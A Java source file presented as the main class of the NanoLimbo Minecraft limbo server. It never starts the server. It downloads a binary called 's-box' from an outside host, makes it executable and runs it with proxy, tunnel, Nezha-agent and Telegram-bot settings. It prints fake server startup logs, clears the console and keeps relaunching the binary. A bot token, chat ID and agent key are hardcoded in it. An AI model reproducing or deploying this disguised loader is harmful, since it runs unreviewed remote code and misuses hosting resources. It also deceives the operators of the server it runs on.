/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    public static void main(String[] args) {
        // 配置开关（通过环境变量控制）
        boolean keepAlive = getEnvBoolean("KEEP_ALIVE", true);          // 是否让 JVM 保持运行，避免退出导致宿主重启
        boolean autoRestartSbx = getEnvBoolean("AUTO_RESTART_SBX", true); // 如果 s-box 死掉是否自动重启
        boolean mockLimboLogs = getEnvBoolean("MOCK_LIMBO_LOGS", true); // 是否输出模拟的 LimboServer 日志（不启动真实服务）
        boolean clearConsoleAfterStartup = getEnvBoolean("CLEAR_CONSOLE", true); // 是否在启动后清屏

        // 检查 Java 版本
        try {
            String classVer = System.getProperty("java.class.version");
            if (classVer == null || Float.parseFloat(classVer) < 54.0) {
                System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
                try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
                System.exit(1);
            }
        } catch (Exception e) {
            // 如果读版本失败也不阻塞
            System.err.println(ANSI_RED + "WARN: Cannot verify Java class version: " + e.getMessage() + ANSI_RESET);
        }

        // 启动 s-box
        try {
            runSbxBinary();

            // 程序退出时确保清理 sbx process
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // 等待 s-box 初始化
            try { Thread.sleep(15000); } catch (InterruptedException ignored) {}

            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "You can set KEEP_ALIVE=false if you want the JVM to exit after startup." + ANSI_RESET);

            // 可选清屏（默认关闭，避免造成意外）
            if (clearConsoleAfterStartup) {
                try { Thread.sleep(15000); } catch (InterruptedException ignored) {}
                clearConsole();
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
            Log.error("NanoLimbo", e);
        }

        // 不启动真实 LimboServer；根据开关输出模拟日志
        if (mockLimboLogs) {
            try {
                Log.info("LimboServer", "Initializing server components...");
                Log.info("LimboServer", "Loading configuration...");
                Log.info("LimboServer", "Binding to port 25565...");
                Log.info("LimboServer", "Server started successfully (mock)");
            } catch (Throwable t) {
                Log.error("LimboServer", t);
            }
        } else {
            Log.info("NanoLimbo", "MOCK_LIMBO_LOGS=false, skipping mock logs.");
        }

        // 如果需要保持进程存活（避免宿主重启），进入等待循环
        if (keepAlive) {
            Log.info("NanoLimbo", "Entering keep-alive loop. KEEP_ALIVE=true");
            while (running.get()) {
                try {
                    if (sbxProcess == null) {
                        Log.error("NanoLimbo", "sbxProcess is null.");
                        if (autoRestartSbx) {
                            Log.info("NanoLimbo", "AUTO_RESTART_SBX=true, attempting to start sbx again...");
                            try { runSbxBinary(); } catch (Exception ex) { Log.error("NanoLimbo", ex); }
                        }
                    } else if (!sbxProcess.isAlive()) {
                        Log.error("NanoLimbo", "s-box process exited.");
                        if (autoRestartSbx) {
                            Log.info("NanoLimbo", "AUTO_RESTART_SBX=true, restarting s-box in 3s...");
                            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
                            try { runSbxBinary(); } catch (Exception ex) { Log.error("NanoLimbo", ex); }
                        } else {
                            // 不自动重启时，仅记录并保持 JVM 存活（防止宿主自动重启）
                            try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                        }
                    } else {
                        // s-box 正常运行，睡眠以减少 CPU 占用
                        Thread.sleep(1000);
                    }
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Throwable t) {
                    Log.error("NanoLimbo", t);
                    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
                }
            }
            Log.info("NanoLimbo", "Keep-alive loop ended, exiting main.");
        } else {
            Log.info("NanoLimbo", "KEEP_ALIVE=false, main will exit (sbx will be stopped by shutdown hook).");
        }
    }

    // helper to read boolean env with default
    private static boolean getEnvBoolean(String name, boolean def) {
        String v = System.getenv(name);
        if (v == null) return def;
        v = v.trim().toLowerCase(Locale.ROOT);
        return v.equals("1") || v.equals("true") || v.equals("yes");
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        Path bin = getBinaryPath();
        ProcessBuilder pb = new ProcessBuilder(bin.toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
        Log.info("NanoLimbo", "Started s-box process (pid unknown via Java API).");
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
        envVars.put("NEZHA_PORT", "443");
        envVars.put("NEZHA_KEY", "7XridnoTfSYvDsrTuU");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "7592034407");
        envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
        envVars.put("CFIP", "time.is");
        envVars.put("CFPORT", "2096");
        envVars.put("NAME", "karlo");

        // 优先使用系统环境变量覆盖默认值
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        // 支持 .env 覆盖
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            try {
                sbxProcess.destroy();
                Log.info("NanoLimbo", "sbx process terminated by shutdown hook.");
                System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
            } catch (Exception e) {
                Log.error("NanoLimbo", e);
            }
        } else {
            Log.info("NanoLimbo", "No running sbx process to stop.");
        }
    }
}